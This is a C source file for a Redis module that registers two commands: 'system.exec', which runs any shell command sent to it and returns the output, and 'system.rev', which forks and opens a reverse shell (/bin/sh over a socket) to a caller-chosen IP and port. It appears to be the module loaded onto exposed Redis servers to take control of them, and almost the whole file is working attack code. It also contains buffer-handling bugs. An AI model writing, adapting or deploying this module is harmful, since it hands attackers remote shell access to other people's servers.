#include "redismodule.h"

#include <stdio.h> 
#include <string.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "process.h"

#ifdef  __cplusplus  
extern "C" {  
#endif  

extern int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc);

#ifdef  __cplusplus  
}  
#endif  /* end of __cplusplus */  


int 
DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    } 

    size_t cmd_len;
    size_t size = 1024;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

    FILE *fp = popen(cmd, "r");
    char *buf, *output;
    buf = (char *)malloc(size);
    output = (char *)malloc(size);
    while ( fgets(buf, sizeof(buf), fp) != 0 ) {
        if (strlen(buf) + strlen(output) >= size) {
            output = (char*)realloc(output, size<<2);
            size <<= 1;
        }
        strcat(output, buf);
    }
    RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
    RedisModule_ReplyWithString(ctx, ret);
    pclose(fp);

    return REDISMODULE_OK;
}


int
RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
    if (argc != 3) {
        return RedisModule_WrongArity(ctx);
    }

    int pid;
    pid = fork();
    if (pid < 0) {
        return REDISMODULE_OK;
    }
    if (pid > 0) {
        /*忽略子进程退出信号*/
        signal(SIGCHLD, SIG_IGN);
        return REDISMODULE_OK;
    }

    bool ret = module_daemon();
    if (!ret) {
        return REDISMODULE_OK;
    }
    size_t cmd_len;
    const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
    const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
    int port = atoi(port_s);
    int s;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);

    return REDISMODULE_OK;
}

int
RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
